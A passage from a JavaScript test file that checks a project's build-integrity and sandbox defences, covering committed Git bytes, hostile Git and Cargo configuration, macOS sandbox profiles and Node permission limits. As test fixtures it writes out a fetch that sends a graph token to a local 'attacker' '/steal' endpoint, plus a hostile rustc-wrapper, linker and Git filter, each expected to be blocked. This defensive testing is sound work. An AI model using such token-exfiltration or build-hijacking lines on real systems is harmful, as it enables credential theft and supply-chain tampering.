    const repositoryRoot = join(tmpdir(), "repository");
    const commit = "a".repeat(40);

    expect(() => readCommittedGitBytes({
      gitPath,
      repositoryRoot,
      commit,
      path: "scripts/control.mjs",
    })).toThrow("fixed system Git");
    expect(() => readGitCommitTree({ gitPath, repositoryRoot, commit })).toThrow("fixed system Git");
    expect(() => readCommittedGitInventory({
      gitPath,
      repositoryRoot,
      commit,
      path: "runtime",
      label: "runtime",
    })).toThrow("fixed system Git");
    expect(() => verifyRepositoryGitAuthority({
      gitPath,
      repositoryRoot,
      revisionPaths: ["runtime"],
    })).toThrow("fixed system Git");
  });

  it("accepts the fixed Git path only under explicit macOS semantics", () => {
    expect(isFixedSystemGit("/usr/bin/git", "darwin")).toBe(true);
    expect(isFixedSystemGit("/usr/bin/git", "win32")).toBe(false);
    expect(isFixedSystemGit("/usr/bin/git", "linux")).toBe(false);
    expect(isFixedSystemGit("C:\\usr\\bin\\git.exe", "win32")).toBe(false);
  });

  it.runIf(Boolean(testGitPath))("materializes bootstrap controls from commit objects across a worktree swap and restore", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-commit-control-"));
    const control = join(directory, "scripts", "control.mjs");
    try {
      mkdirSync(join(directory, "scripts"), { recursive: true });
      writeFileSync(control, "export const authority = 'committed';\n");
      execFileSync(testGitPath, ["init", "-q"], { cwd: directory });
      execFileSync(testGitPath, ["add", "scripts/control.mjs"], { cwd: directory });
      execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "control"], { cwd: directory });
      const commit = execFileSync(testGitPath, ["rev-parse", "HEAD"], { cwd: directory, encoding: "utf8" }).trim();
      const tree = readGitCommitTree({ gitPath: testGitPath, repositoryRoot: directory, commit });
      const expected = readCommittedGitBytes({ gitPath: testGitPath, repositoryRoot: directory, commit, path: "scripts/control.mjs" });

      const inherited = {
        PATH: process.env.PATH,
        GIT_OBJECT_DIRECTORY: process.env.GIT_OBJECT_DIRECTORY,
        GIT_CONFIG_GLOBAL: process.env.GIT_CONFIG_GLOBAL,
      };
      process.env.PATH = join(directory, "hostile-bin");
      process.env.GIT_OBJECT_DIRECTORY = join(directory, "hostile-objects");
      process.env.GIT_CONFIG_GLOBAL = join(directory, "hostile-gitconfig");
      let hostileEnvironmentRead;
      try {
        hostileEnvironmentRead = readCommittedGitBytes({
          gitPath: testGitPath,
          repositoryRoot: directory,
          commit,
          path: "scripts/control.mjs",
        });
      } finally {
        for (const [key, value] of Object.entries(inherited)) {
          if (value === undefined) delete process.env[key];
          else process.env[key] = value;
        }
      }
      expect(hostileEnvironmentRead?.equals(expected)).toBe(true);

      writeFileSync(control, "export const authority = 'swapped';\n");
      const copiedDuringSwap = readCommittedGitBytes({ gitPath: testGitPath, repositoryRoot: directory, commit, path: "scripts/control.mjs" });
      writeFileSync(control, expected);

      expect(copiedDuringSwap.equals(expected)).toBe(true);
      expect(readFileSync(control).equals(expected)).toBe(true);
      expect(readGitCommitTree({ gitPath: testGitPath, repositoryRoot: directory, commit })).toBe(tree);
      expect(() => readCommittedGitBytes({
        gitPath: join(directory, "fake-git"),
        repositoryRoot: directory,
        commit,
        path: "scripts/control.mjs",
      })).toThrow("fixed system Git");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(Boolean(testGitPath))("inventories exact commit-object bytes without checkout filters", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-commit-inventory-"));
    try {
      mkdirSync(join(directory, "runtime"), { recursive: true });
      writeFileSync(join(directory, "runtime", "entry.js"), "export const value = 'committed';\n");
      writeFileSync(join(directory, "runtime", "second.js"), "export const second = true;\n");
      execFileSync(testGitPath, ["init", "-q"], { cwd: directory });
      execFileSync(testGitPath, ["add", "runtime"], { cwd: directory });
      execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "runtime"], { cwd: directory });
      const commit = execFileSync(testGitPath, ["rev-parse", "HEAD"], { cwd: directory, encoding: "utf8" }).trim();
      const expectedBytes = readFileSync(join(directory, "runtime", "entry.js"));

      writeFileSync(join(directory, "runtime", "entry.js"), "export const value = 'swapped';\n");
      const inventory = readCommittedGitInventory({
        gitPath: testGitPath,
        repositoryRoot: directory,
        commit,
        path: "runtime",
        label: "runtime",
      });
      expect(inventory).toContainEqual({
        file: "runtime/entry.js",
        bytes: expectedBytes.byteLength,
        sha256: createHash("sha256").update(expectedBytes).digest("hex"),
      });
      expect(inventory.find((entry) => entry.file === "runtime/entry.js")?.sha256)
        .not.toBe(createHash("sha256").update(readFileSync(join(directory, "runtime", "entry.js"))).digest("hex"));
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(Boolean(testGitPath && testArchivePath))("materializes fresh build source from commit bytes and excludes ignored checkout outputs", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-fresh-build-source-"));
    const source = join(directory, "source");
    const fresh = join(directory, "fresh");
    try {
      mkdirSync(join(source, "src"), { recursive: true });
      mkdirSync(join(source, "target", "debug", ".fingerprint", "hostile-build"), { recursive: true });
      writeFileSync(join(source, ".gitignore"), "target/\nhidden-build-input\n");
      writeFileSync(join(source, "src", "main.rs"), "fn main() {}\n");
      writeFileSync(join(source, "target", "debug", "relayer-app-server"), "tampered checkout binary\n");
      writeFileSync(join(source, "target", "debug", ".fingerprint", "hostile-build", "invoked.timestamp"), "fresh-looking incremental state\n");
      writeFileSync(join(source, "hidden-build-input"), "must never reach fresh build\n");
      execFileSync(testGitPath, ["init", "-q"], { cwd: source });
      execFileSync(testGitPath, ["add", ".gitignore", "src/main.rs"], { cwd: source });
      execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "source"], { cwd: source });
      const commit = execFileSync(testGitPath, ["rev-parse", "HEAD"], { cwd: source, encoding: "utf8" }).trim();
      const archive = execFileSync(testGitPath, ["archive", "--format=tar", commit], { cwd: source });
      mkdirSync(fresh);
      execFileSync(testArchivePath, ["-xf", "-", "-C", fresh], { input: archive });

      const committed = readCommittedGitInventory({
        gitPath: testGitPath,
        repositoryRoot: source,
        commit,
        path: ".",
        label: "<fresh-build-source>",
      });
      await expect(inventoryRegularArtifactTree({ root: fresh, label: "<fresh-build-source>" })).resolves.toEqual(committed);
      expect(() => readFileSync(join(fresh, "target", "debug", "relayer-app-server"))).toThrow();
      expect(() => readFileSync(join(fresh, "target", "debug", ".fingerprint", "hostile-build", "invoked.timestamp"))).toThrow();
      expect(() => readFileSync(join(fresh, "hidden-build-input"))).toThrow();

      const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
      expect(capture).toContain('const freshTarget = join(freshRustOutput, "target");');
      expect(capture).toContain('if (existsSync(freshTarget)) throw new Error("Fresh Rust target directory existed before the authenticated build.");');
      expect(capture).toContain('source: join(freshTarget, "debug", "relayer-app-server")');
      expect(capture).not.toContain('source: join(repositoryRoot, "target", "debug", "relayer-app-server")');
      expect(capture).toContain("Copied JavaScript build dependencies do not match their inventoried source bytes.");
      expect(capture).toContain('const freshDesktopOutput = join(freshOutput, "desktop");');
      expect(capture).toContain('"lucide", "dist", "umd", "lucide.min.js"');
      expect(capture).toContain('"marked", "lib", "marked.umd.js"');
      expect(capture).toContain("Fresh desktop renderer vendors do not match their authenticated sources.");
      expect(capture).toContain('{ source: freshDesktopOutput, label: "desktop" }');
      expect(capture).toContain('label: "<build-dependency>/cargo-config.toml"');
      expect(capture).toContain("<build-tool-dynamic-library>");
      expect(capture).toContain("copiedExternalInputsMatchInventoriedSources: true");
      expect(capture).toContain("await makeTreeReadOnly(freshRoot);");
      expect(capture).toContain("await verifyFreshBuildSource();");
      expect(capture).toContain("createPinnedFreshBuildSandboxProfile");
      expect(capture).toContain("rejectAncestorCargoConfiguration(repositoryRoot);");
      expect(capture).toContain("A fresh-build bootstrap tool changed before first use.");
      expect(capture).toContain("-fuse-ld=${sourceLdPath}");
      expect(capture).toContain("freshBuild: freshBuildRelation");
      expect(capture).toContain("Fresh build inputs or outputs changed after the authenticated build relation was recorded.");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("rejects Cargo configuration inherited from any build-source ancestor", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-cargo-authority-"));
    const source = join(directory, "workspace", "source");
    try {
      mkdirSync(source, { recursive: true });
      expect(() => rejectAncestorCargoConfiguration(source)).not.toThrow();
      mkdirSync(join(directory, ".cargo"));
      writeFileSync(join(directory, ".cargo", "config.toml"), '[build]\nrustc-wrapper = "/tmp/hostile-wrapper"\n');
      expect(() => rejectAncestorCargoConfiguration(source)).toThrow("ancestor Cargo configuration");
      rmSync(join(directory, ".cargo"), { recursive: true, force: true });
      mkdirSync(join(directory, "workspace", ".cargo"));
      writeFileSync(join(directory, "workspace", ".cargo", "config"), '[target.aarch64-apple-darwin]\nlinker = "/tmp/hostile-linker"\n');
      expect(() => rejectAncestorCargoConfiguration(source)).toThrow("ancestor Cargo configuration");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")("allows an authenticated fresh output while denying source mutation in the build sandbox", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-fresh-build-sandbox-"));
    const source = join(directory, "source");
    const output = join(directory, "output");
    const temporary = join(directory, "tmp");
    const profile = join(directory, "build.sb");
    try {
      mkdirSync(source);
      mkdirSync(output);
      mkdirSync(temporary);
      writeFileSync(join(source, "input.txt"), "authenticated source\n");
      const canonicalDirectory = realpathSync(directory);
      const canonicalSource = join(canonicalDirectory, "source");
      const canonicalOutput = join(canonicalDirectory, "output");
      const canonicalTemporary = join(canonicalDirectory, "tmp");
      writeFileSync(profile, createPinnedFreshBuildSandboxProfile({
        readPaths: [canonicalSource, "/bin", "/System/Library", "/System/Volumes/Preboot/Cryptexes/OS", "/usr/lib", "/dev", "/private/var/db/timezone"],
        writePaths: [canonicalOutput, canonicalTemporary, "/dev/null"],
        executablePaths: ["/bin/cp", "/bin/sh", "/bin/bash"],
      }));
      const successful = spawnSync("/usr/bin/sandbox-exec", [
        "-f", profile, "/bin/cp", join(source, "input.txt"), join(output, "built.txt"),
      ], { encoding: "utf8" });
      expect(successful.status, successful.stderr).toBe(0);
      expect(readFileSync(join(output, "built.txt"), "utf8")).toBe("authenticated source\n");
      const nullRedirect = spawnSync("/usr/bin/sandbox-exec", [
        "-f", profile, "/bin/sh", "-c", "printf ignored > /dev/null",
      ], { encoding: "utf8" });
      expect(nullRedirect.status, nullRedirect.stderr).toBe(0);

      const denied = spawnSync("/usr/bin/sandbox-exec", [
        "-f", profile, "/bin/sh", "-c", `echo hostile > ${JSON.stringify(join(source, "input.txt"))}`,
      ], { encoding: "utf8" });
      expect(denied.status).not.toBe(0);
      expect(readFileSync(join(source, "input.txt"), "utf8")).toBe("authenticated source\n");

      const expected = await inventoryRegularArtifactTree({ root: source, label: "<source>" });
      writeFileSync(join(source, "input.txt"), "mutated during build\n");
      await expect(inventoryRegularArtifactTree({ root: source, label: "<source>" })).resolves.not.toEqual(expected);
      const tool = join(directory, "tool");
      writeFileSync(tool, "tool-v1\n");
      const authenticatedTool = await inventoryRegularArtifactTree({ root: tool, label: "<tool>" });
      writeFileSync(tool, "tool-v2\n");
      await expect(inventoryRegularArtifactTree({ root: tool, label: "<tool>" })).resolves.not.toEqual(authenticatedTool);
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")("prevents later build phases from overwriting completed outputs", () => {
    const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-build-phase-sandbox-")));
    const graphOutput = join(directory, "graph-output");
    const harnessOutput = join(directory, "harness-output");
    const rustOutput = join(directory, "rust-output");
    const temporary = join(directory, "tmp");
    try {
      for (const path of [graphOutput, harnessOutput, rustOutput, temporary]) mkdirSync(path);
      writeFileSync(join(graphOutput, "index.js"), "authenticated graph output\n");
      writeFileSync(join(harnessOutput, "index.js"), "authenticated harness output\n");
      const executePhase = (profileName, readPaths, writePaths, command) => {
        const profile = join(directory, profileName);
        writeFileSync(profile, createPinnedFreshBuildSandboxProfile({
          readPaths: [...readPaths, "/bin", "/System/Library", "/System/Volumes/Preboot/Cryptexes/OS", "/usr/lib", "/dev/null"],
          writePaths,
          executablePaths: ["/bin/sh"],
        }));
        return spawnSync("/usr/bin/sandbox-exec", ["-f", profile, "/bin/sh", "-c", command], { encoding: "utf8" });
      };
      const maliciousHarness = executePhase(
        "harness.sb",
        [graphOutput],
        [harnessOutput, temporary],
        `printf replaced > ${JSON.stringify(join(graphOutput, "index.js"))}`,
      );
      expect(maliciousHarness.status).not.toBe(0);
      expect(readFileSync(join(graphOutput, "index.js"), "utf8")).toBe("authenticated graph output\n");

      const maliciousRust = executePhase(
        "rust.sb",
        [graphOutput, harnessOutput],
        [rustOutput, temporary],
        `printf replaced > ${JSON.stringify(join(harnessOutput, "index.js"))}`,
      );
      expect(maliciousRust.status).not.toBe(0);
      expect(readFileSync(join(harnessOutput, "index.js"), "utf8")).toBe("authenticated harness output\n");

      const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
      expect(capture).toContain("graphBuildSandboxProfile");
      expect(capture).toContain("harnessBuildSandboxProfile");
      expect(capture).toContain("rustBuildSandboxProfile");
      expect(capture).toContain("Rust compilation changed a completed JavaScript output.");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(Boolean(testGitPath))("rejects repository-local filters, worktree redirects, and hidden tracked index flags", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-git-authority-"));
    try {
      writeFileSync(join(directory, "runtime.js"), "export {};\n");
      execFileSync(testGitPath, ["init", "-q"], { cwd: directory });
      execFileSync(testGitPath, ["add", "runtime.js"], { cwd: directory });
      execFileSync(testGitPath, ["-c", "user.name=Relayer Test", "-c", "user.email=test@relayer.invalid", "commit", "-qm", "runtime"], { cwd: directory });
      const verify = () => verifyRepositoryGitAuthority({
        gitPath: testGitPath,
        repositoryRoot: directory,
        revisionPaths: ["runtime.js"],
      });
      expect(verify).not.toThrow();

      execFileSync(testGitPath, ["config", "filter.hostile.process", "/tmp/hostile-filter"], { cwd: directory });
      expect(verify).toThrow("local filters");
      execFileSync(testGitPath, ["config", "--unset-all", "filter.hostile.process"], { cwd: directory });

      execFileSync(testGitPath, ["config", "core.excludesFile", join(directory, "hidden-excludes")], { cwd: directory });
      expect(verify).toThrow("excludes");
      execFileSync(testGitPath, ["config", "--unset-all", "core.excludesFile"], { cwd: directory });

      const infoExclude = execFileSync(testGitPath, ["rev-parse", "--git-path", "info/exclude"], { cwd: directory, encoding: "utf8" }).trim();
      const infoExcludeFile = join(directory, infoExclude);
      const originalInfoExclude = readFileSync(infoExcludeFile);
      writeFileSync(infoExcludeFile, "hidden-build-input\n");
      expect(verify).toThrow("excludes");
      writeFileSync(infoExcludeFile, originalInfoExclude);

      execFileSync(testGitPath, ["update-index", "--skip-worktree", "runtime.js"], { cwd: directory });
      expect(verify).toThrow("skip-worktree");
      execFileSync(testGitPath, ["update-index", "--no-skip-worktree", "runtime.js"], { cwd: directory });
      execFileSync(testGitPath, ["update-index", "--assume-unchanged", "runtime.js"], { cwd: directory });
      expect(verify).toThrow("assume-unchanged");
      execFileSync(testGitPath, ["update-index", "--no-assume-unchanged", "runtime.js"], { cwd: directory });

      execFileSync(testGitPath, ["config", "core.worktree", join(directory, "redirected")], { cwd: directory });
      expect(verify).toThrow("worktree redirects");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("derives the evidence README from commit bytes and revalidates copied native closure", () => {
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain("const publishedReadme = gitObjectBytes(");
    expect(capture).not.toContain('readFileSync(join(publishedDirectory, "README.md")');
    const integrity = readFileSync(join(import.meta.dirname, "..", "scripts", "evidence-capture-integrity.mjs"), "utf8");
    expect(integrity).toContain("Mach-O runtime artifact changed during dependency discovery");
    expect(capture).toContain("verifySnapshottedMachOClosure(specs, snapshotRoot);");
    expect(capture).toContain("Snapshotted Mach-O dependency closure differs from authenticated discovery");
  });

  it("records authenticated component versions and proves exact grants do not cross live sessions", () => {
    const capture = readFileSync(join(import.meta.dirname, "..", "scripts", "capture-ask-profile-evidence.mjs"), "utf8");
    expect(capture).toContain('dirname, isAbsolute, join');
    expect(capture).toContain("process.noAsar = true");
    expect(capture).toContain('desktop: committedJsonVersion("desktop/package.json", "desktop")');
    expect(capture).toContain("appServer: rustWorkspaceVersion");
    expect(capture).toContain("graphServer: rustWorkspaceVersion");
    expect(capture).toContain("versions: {");
    expect(capture).toContain("desktopVersion: sourceVersions.desktop");
    expect(capture).not.toContain('version: "issue-85-evidence"');
    expect(capture).toContain('title: "Live Ask-profile cross-session isolation"');
    expect(capture).toContain("isolatedHarnessSessionId === sourceHarnessSessionId");
    expect(capture).toContain('capture("cross-session-exact-waiting"');
    expect(capture).toContain("crossSessionProof: sanitizeEvidence(crossSessionProof)");
    expect(capture).toContain('freshCargoHome, "/dev/null"], [freshTarget]');
  });

  it("rejects at the deadline while a check remains pending", async () => {
    vi.useFakeTimers();
    try {
      const pending = settleBeforeDeadline(() => new Promise(() => {}), {
        label: "renderer check",
        deadline: 1_250,
        timeoutMs: 250,
        now: () => 1_000,
      });
      const rejected = expect(pending).rejects.toMatchObject({ code: "RELAYER_WAIT_DEADLINE" });
      await vi.advanceTimersByTimeAsync(250);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });

  it("does not start a check after its deadline", async () => {
    const check = vi.fn();
    await expect(settleBeforeDeadline(check, {
      label: "expired check",
      deadline: 999,
      timeoutMs: 250,
      now: () => 1_000,
    })).rejects.toMatchObject({ code: "RELAYER_WAIT_DEADLINE" });
    expect(check).not.toHaveBeenCalled();
  });

  it("interrupts a pending check without waiting for its deadline", async () => {
    let interrupt;
    const interruption = new Promise((resolve) => { interrupt = resolve; });
    const pending = settleBeforeDeadline(() => new Promise(() => {}), {
      label: "renderer check",
      deadline: Date.now() + 60_000,
      timeoutMs: 60_000,
      interruption,
    });
    const rejected = expect(pending).rejects.toMatchObject({ code: "RELAYER_WAIT_INTERRUPTED" });
    interrupt();
    await rejected;
  });

  it("aborts timed-out media, awaits close, and preserves diagnostics", async () => {
    vi.useFakeTimers();
    try {
      let close;
      let closed = false;
      const closePromise = new Promise((resolve) => { close = resolve; });
      const abort = vi.fn(() => {
        queueMicrotask(() => {
          closed = true;
          close();
        });
      });
      const pending = settleMediaCompletion(new Promise(() => {}), {
        label: "ffmpeg encoder",
        timeoutMs: 250,
        abort,
        closed: closePromise,
        diagnostics: () => "decoder stalled",
      });
      const rejected = expect(pending).rejects.toMatchObject({
        code: "RELAYER_MEDIA_DEADLINE",
        message: expect.stringContaining("decoder stalled"),
      });
      await vi.advanceTimersByTimeAsync(250);
      await rejected;
      expect(abort).toHaveBeenCalledOnce();
      expect(closed).toBe(true);
    } finally {
      vi.useRealTimers();
    }
  });

  it("also aborts and awaits close after a media process error", async () => {
    let close;
    const closed = new Promise((resolve) => { close = resolve; });
    const abort = vi.fn(close);
    await expect(settleMediaCompletion(Promise.reject(new Error("encoder failed")), {
      label: "ffmpeg encoder",
      timeoutMs: 60_000,
      abort,
      closed,
    })).rejects.toThrow("encoder failed");
    expect(abort).toHaveBeenCalledOnce();
  });

  it("retains media stderr and the original cause when encoder input fails first", async () => {
    let close;
    const closed = new Promise((resolve) => { close = resolve; });
    const inputError = new Error("write EPIPE");
    const abort = vi.fn(() => queueMicrotask(close));
    await expect(settleMediaCompletion(Promise.reject(inputError), {
      label: "ffmpeg frame encoder",
      timeoutMs: 60_000,
      abort,
      closed,
      diagnostics: () => "invalid JPEG data at frame 4",
    })).rejects.toMatchObject({
      message: expect.stringContaining("invalid JPEG data at frame 4"),
      cause: inputError,
    });
    expect(abort).toHaveBeenCalledOnce();
  });

  it("forces media shutdown after the abort grace and still awaits close", async () => {
    vi.useFakeTimers();
    try {
      let close;
      const closed = new Promise((resolve) => { close = resolve; });
      const abort = vi.fn();
      const force = vi.fn(close);
      const pending = settleMediaCompletion(Promise.reject(new Error("encoder failed")), {
        label: "ffmpeg encoder",
        timeoutMs: 60_000,
        abort,
        force,
        closed,
        abortCloseTimeoutMs: 250,
        forceCloseTimeoutMs: 250,
      });
      const rejected = expect(pending).rejects.toThrow("encoder failed");
      await vi.advanceTimersByTimeAsync(250);
      await rejected;
      expect(abort).toHaveBeenCalledOnce();
      expect(force).toHaveBeenCalledOnce();
    } finally {
      vi.useRealTimers();
    }
  });

  it("hard-fails when forced media shutdown never closes", async () => {
    vi.useFakeTimers();
    try {
      const pending = settleMediaCompletion(Promise.reject(new Error("encoder failed")), {
        label: "ffmpeg encoder",
        timeoutMs: 60_000,
        abort: vi.fn(),
        force: vi.fn(),
        closed: new Promise(() => {}),
        diagnostics: () => "stuck stderr",
        abortCloseTimeoutMs: 250,
        forceCloseTimeoutMs: 250,
      });
      const rejected = expect(pending).rejects.toMatchObject({
        code: "RELAYER_MEDIA_CLOSE_DEADLINE",
        message: expect.stringContaining("stuck stderr"),
      });
      await vi.advanceTimersByTimeAsync(500);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });

  it("pins every frame independently and rejects changed disk bytes", () => {
    const pins = new Map();
    pinUniqueBytes(pins, "frame-000000.jpg", Buffer.from("first"));
    pinUniqueBytes(pins, "frame-000001.jpg", Buffer.from("second"));
    const observed = [...pins.values()].map((pin) => ({ ...pin }));
    expect(verifyPinnedByteInventory(pins, observed)).toEqual(observed);
    observed[1] = { file: observed[1].file, ...bytePin(Buffer.from("changed")) };
    expect(() => verifyPinnedByteInventory(pins, observed)).toThrow("changed after they were pinned");
  });

  it("rejects a frame path being reused and commits to sequence order", () => {
    const pins = new Map();
    pinUniqueBytes(pins, "frame-000001.jpg", Buffer.from("second"));
    pinUniqueBytes(pins, "frame-000000.jpg", Buffer.from("first"));
    const digest = pinnedSequenceSha256(pins);
    expect(digest).toMatch(/^[0-9a-f]{64}$/);
    expect(() => pinUniqueBytes(pins, "frame-000000.jpg", Buffer.from("replacement"))).toThrow("more than once");
  });

  it("returns only retained buffers that still match their pins", () => {
    const pins = new Map();
    const buffers = new Map();
    const second = Buffer.from("second");
    const first = Buffer.from("first");
    pinUniqueBytes(pins, "frame-000001.jpg", second);
    pinUniqueBytes(pins, "frame-000000.jpg", first);
    buffers.set("frame-000001.jpg", second);
    buffers.set("frame-000000.jpg", first);
    expect(pinnedBuffersInFileOrder(pins, buffers)).toEqual([first, second]);
    second.fill(0);
    expect(() => pinnedBuffersInFileOrder(pins, buffers)).toThrow("changed after they were pinned");
  });

  it("pipes every retained frame with backpressure and surfaces sink errors", async () => {
    const written = [];
    const sink = new Writable({
      highWaterMark: 1,
      write(chunk, _encoding, callback) {
        written.push(Buffer.from(chunk));
        setImmediate(callback);
      },
    });
    await pipeByteChunks(sink, [Buffer.from("first"), Buffer.from("second")]);
    expect(Buffer.concat(written).toString()).toBe("firstsecond");

    const failed = new Writable({
      write(_chunk, _encoding, callback) {
        callback(new Error("encoder input failed"));
      },
    });
    await expect(pipeByteChunks(failed, [Buffer.from("frame")])).rejects.toThrow("encoder input failed");
  });

  it("structurally requires the pinned graph-authoring Node command", () => {
    const event = (command, commandActions = [{ command }]) => ({
      type: "provider.event",
      data: { method: "item/started", params: { item: { type: "commandExecution", command, commandActions } } },
    });
    expect(validateEvidenceCommands([
      event('/bin/zsh -lc "graph"', [{ command: '"/private/var/folders/[redacted]/runtime/graph-authoring-launcher" <<\'EOF\'\nconst detail = "curl is documentation, not a shell action";\nawait graph.submit(node);\nEOF' }]),
    ])).toBe(1);
    expect(validateEvidenceCommands([
      event('/bin/zsh -lc "graph"', [{ command: '"/private/var/folders/[redacted]/runtime/graph-authoring-launcher" <<\'EOF\'\nawait graph.submit(node);\nEOF' }]),
    ])).toBe(1);
    expect(() => validateEvidenceCommands([
      event("node --input-type=module <<'EOF'\nEOF"),
    ])).toThrow("exact pinned graph-authoring launcher heredoc");
    expect(() => validateEvidenceCommands([
      event('/bin/zsh -lc "graph"', [{ command: '"/private/var/folders/[redacted]/runtime/graph-authoring-launcher" <<\'EOF\'\nEOF\nnode --input-type=module' }]),
    ])).toThrow("exact pinned graph-authoring launcher heredoc");
  });

  it("enforces the graph-authoring filesystem boundary in the pinned Node runtime", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-graph-authoring-permission-"));
    const allowedRoot = join(import.meta.dirname, "..", "packages", "graph-client");
    const privateFile = join(directory, "private.txt");
    const privateModule = join(directory, "private.mjs");
    try {
      const allowedModule = join(allowedRoot, "dist", "index.js");
      writeFileSync(privateFile, "personal evidence must remain unreadable\n");
      writeFileSync(privateModule, "export const privateValue = 'secret';\n");
      const flags = ["--permission", `--allow-fs-read=${allowedRoot}`, "--input-type=module"];

      const success = spawnSync(process.execPath, flags, {
        input: `const { NodeObject } = await import(${JSON.stringify(pathToFileURL(allowedModule).href)}); const node = new NodeObject("info", "Allowed", "Graph client loaded", "concept", "permission-test"); if (node.title !== "Allowed") process.exit(2);\n`,
        encoding: "utf8",
      });
      expect(success.status).toBe(0);

      for (const program of [
        `const { readFile } = await import("node:fs/promises"); await readFile(${JSON.stringify(privateFile)}, "utf8");\n`,
        `await import(${JSON.stringify(pathToFileURL(privateModule).href)});\n`,
      ]) {
        const denied = spawnSync(process.execPath, flags, { input: program, encoding: "utf8" });
        expect(denied.status).not.toBe(0);
        expect(`${denied.stdout}\n${denied.stderr}`).toMatch(/ERR_ACCESS_DENIED|permission/i);
      }
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform === "darwin")("runs the real graph client with exact-port IPv4 egress while excluding inherited provider secrets", async () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-graph-launcher-"));
    const graphClientRoot = join(import.meta.dirname, "..", "packages", "graph-client");
    const launcher = join(directory, "graph-authoring-launcher");
    const networkProfile = join(directory, "graph-authoring-network.sb");
    let attackerRequests = 0;
    let ipv6AttackerRequests = 0;
    const server = createServer((request, response) => {
      if (request.url !== "/api/graph/nodes/1" || request.headers.authorization !== "Bearer graph-token") {
        response.writeHead(403).end(JSON.stringify({ error: { message: "bad capability" } }));
        return;
      }
      response.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ node: { id: 1 } }));
    });
    const attackerServer = createServer((_request, response) => {
      attackerRequests += 1;
      response.writeHead(200).end("leaked");
    });
    const ipv6AttackerServer = createServer((_request, response) => {
      ipv6AttackerRequests += 1;
      response.writeHead(200).end("leaked-v6");
    });
    try {
      writeFileSync(networkProfile, createPinnedGraphAuthoringNetworkProfile(), { mode: 0o600 });
      writeFileSync(launcher, createPinnedGraphAuthoringLauncherScript({
        nodePath: process.execPath,
        graphClientRoot,
        sandboxExecPath: "/usr/bin/sandbox-exec",
        networkProfilePath: networkProfile,
      }), { mode: 0o700 });
      await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
      await new Promise((resolve) => attackerServer.listen(0, "127.0.0.1", resolve));
      const address = server.address();
      const attackerAddress = attackerServer.address();
      if (typeof address === "string" || address === null) throw new Error("test server did not bind a TCP port");
      if (typeof attackerAddress === "string" || attackerAddress === null) throw new Error("attacker server did not bind a TCP port");
      await new Promise((resolve, reject) => {
        ipv6AttackerServer.once("error", reject);
        ipv6AttackerServer.listen({ port: address.port, host: "::1", ipv6Only: true }, resolve);
      });
      const program = [
        `const { RelayerGraphClient } = await import(${JSON.stringify(pathToFileURL(join(graphClientRoot, "dist", "index.js")).href)});`,
        'if (process.env.RELAYER_PROBE_SECRET !== undefined || process.env.OPENAI_API_KEY !== undefined) throw new Error("provider secret leaked");',
        "const node = await RelayerGraphClient.fromEnv().getNode(1);",
        'if (node.id !== 1) throw new Error("graph client failed");',
        `try { await fetch("http://127.0.0.1:${attackerAddress.port}/steal", { headers: { authorization: process.env.RELAYER_GRAPH_TOKEN } }); throw new Error("egress escaped"); } catch (error) { if (error.message === "egress escaped") throw error; }`,
        `try { await fetch("http://[::1]:${address.port}/steal", { headers: { authorization: process.env.RELAYER_GRAPH_TOKEN } }); throw new Error("IPv6 egress escaped"); } catch (error) { if (error.message === "IPv6 egress escaped") throw error; }`,
        'console.log(Object.keys(process.env).sort().join(","));',
      ].join("\n");
      const result = await new Promise((resolve, reject) => {
        const child = spawn(launcher, [], {
          env: {
            ...process.env,
            OPENAI_API_KEY: "must-not-reach-graph-program",
            RELAYER_PROBE_SECRET: "must-not-reach-graph-program",
            RELAYER_GRAPH_URL: `http://127.0.0.1:${address.port}`,
            RELAYER_GRAPH_TOKEN: "graph-token",
            RELAYER_NODE_ID: "1",
          },
          stdio: ["pipe", "pipe", "pipe"],
        });
        let stdout = "";
        let stderr = "";
        child.stdout.on("data", (chunk) => { stdout += chunk; });
        child.stderr.on("data", (chunk) => { stderr += chunk; });
        child.once("error", reject);
        child.once("close", (status) => resolve({ status, stdout, stderr }));
        child.stdin.end(program);
      });
      expect(result).toMatchObject({ status: 0 });
      expect(result.stderr).not.toContain("provider secret leaked");
      expect(result.stdout.trim().split(",").filter((name) => name !== "__CF_USER_TEXT_ENCODING")).toEqual([
        "LANG", "LC_ALL", "RELAYER_GRAPH_TOKEN", "RELAYER_GRAPH_URL", "RELAYER_NODE_ID",
      ]);
      expect(attackerRequests).toBe(0);
      expect(ipv6AttackerRequests).toBe(0);
    } finally {
      await new Promise((resolve) => server.close(resolve));
      await new Promise((resolve) => attackerServer.close(resolve));
      await new Promise((resolve) => ipv6AttackerServer.close(resolve));
